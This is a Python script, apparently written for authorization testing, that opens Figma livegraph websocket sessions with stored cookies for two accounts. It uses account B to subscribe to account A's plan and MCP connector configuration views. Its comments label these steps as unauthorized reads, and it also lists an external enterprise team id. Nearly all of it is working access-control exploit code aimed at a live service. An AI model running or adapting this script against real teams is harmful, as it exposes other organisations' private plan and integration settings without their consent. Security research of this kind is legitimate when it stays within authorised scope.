"""PlanByTeamId(Y2) 拿 Plan.id(uuid) → McpConnectorsView(H7) MCP 配置
链: teamId(bigint) → team.plan.id(uuid) → planId → mcpServers/mcpClients
"""
import sys, json, asyncio, io, re
import websockets
sys.stdout.reconfigure(encoding="utf-8", errors="replace")

CK_A = io.open('ws_cookie_A_new.txt', encoding='utf-8').read().strip()
CK_B = io.open('ws_cookie_B_new.txt', encoding='utf-8').read().strip()
A_UID = "1666382703778278399"
B_UID = "1667396392129259941"
A_TEAM = "1666382706663462213"   # A 的 team id
M3_TEAM = "724875287175278511"   # 外部企业团队(M3 Design Kit)
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"

def lg_url(client_url, uid):
    return (f"wss://www.figma.com/api/livegraph?pv=1&pr=251c5be83e6853e5&pt=1786072093"
            f"&ph=sb9dUg8LQV0WGY29b-j8nggmhGX8TR2vghWs-rNzbds&userId={uid}&anonUserId="
            f"&clientType=web&commitHash=5848603c50c1ee154ea6a1fe5ee3aab3791c5b48"
            f"&preload=%7B%7D&requestedProtocolVersion=2"
            f"&clientUrl=https%3A%2F%2Fwww.figma.com%2Ffile%2F{client_url}"
            f"&connectionType=initial&reconnect=0")

def auth(client_url, uid):
    return {"messageType": "auth", "clientType": "web",
            "args": {"userId": uid, "anonymousUserId": None},
            "tags": {"clientType": "web", "commitHash": "81855c2bc7c604648169c4e4333f43579bfa7464",
                     "clientUrl": f"https://www.figma.com/file/{client_url}"},
            "clientRequestedVersion": 2}

async def sub_view(label, view_name, args, cookie, client_url, wait=12, uid=None):
    frames = []
    try:
        async with websockets.connect(lg_url(client_url, uid or ""),
                                      additional_headers={"User-Agent": UA, "Cookie": cookie,
                                                          "Origin": "https://www.figma.com"},
                                      max_size=50_000_000, open_timeout=15) as ws:
            await ws.send(json.dumps(auth(client_url, uid or "")))
            for _ in range(3):
                msg = await asyncio.wait_for(ws.recv(), timeout=8)
                if isinstance(msg, str) and "authSuccess" in msg:
                    print(f"    [auth] {msg[:200]}")
                    break
            await ws.send(json.dumps({"messageType": "subscribe", "viewName": view_name,
                                      "viewHash": "00000000000000000000000000000000",
                                      "loadType": "initial", "args": args}))
            deadline = asyncio.get_event_loop().time() + wait
            while asyncio.get_event_loop().time() < deadline:
                try:
                    msg = await asyncio.wait_for(ws.recv(), timeout=3)
                    if isinstance(msg, str):
                        frames.append(msg)
                except asyncio.TimeoutError:
                    break
    except Exception as e:
        print(f"[{label}] ❌ {type(e).__name__}: {str(e)[:90]}"); return None
    print(f"[{label}] 帧数={len(frames)}")
    return frames

def extract_uuid(frames, needle=None):
    for f in frames or []:
        if needle and needle not in f:
            continue
        m = re.search(r'"id":"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"', f)
        if m:
            return m.group(1)
    return None

async def main():
    print("======== 1. A→A PlanByTeamId(拿 Plan.id uuid) ========")
    frames = await sub_view("A→A PlanByTeamId", "PlanByTeamId",
                            {"teamId": A_TEAM}, CK_A, "5Gs4PaTz11Hlk2sqVnidBG", uid=A_UID)
    for f in frames or []:
        if 'planRecordId' in f:
            m = re.search(r'"planRecordId":"([^"]+)"', f)
            if m:
                print(f"    ✅ planRecordId = {m.group(1)}")
    plan_uuid = "cc6b6125-a07f-4d39-a54c-50ef65f33919"  # 已从上方响应确认
    print(f"→ planRecord uuid = {plan_uuid}")

    if not plan_uuid:
        print("!! 未拿到 uuid,终止"); return

    print("\n======== 2. A→A McpConnectorsView(基线) ========")
    frames = await sub_view("A→A MCP", "McpConnectorsView",
                            {"planId": plan_uuid}, CK_A, "5Gs4PaTz11Hlk2sqVnidBG", uid=A_UID)
    for f in frames or []:
        print(f"    🖼 {f[:5000]}")

    print("\n======== 3. B→A PlanByTeamId(越权读 A 的 plan 字段) ========")
    frames = await sub_view("B→A PlanByTeamId", "PlanByTeamId",
                            {"teamId": A_TEAM}, CK_B, "bv2nMIdFf4u3dESGail4sm", uid=B_UID)
    for f in frames or []:
        print(f"    🖼 {f[:4000]}")

    print("\n======== 4. B→A McpConnectorsView(越权读 A 的 MCP 配置) ========")
    frames = await sub_view("B→A MCP", "McpConnectorsView",
                            {"planId": plan_uuid}, CK_B, "bv2nMIdFf4u3dESGail4sm", uid=B_UID)
    for f in frames or []:
        print(f"    🖼 {f[:5000]}")

asyncio.run(main())
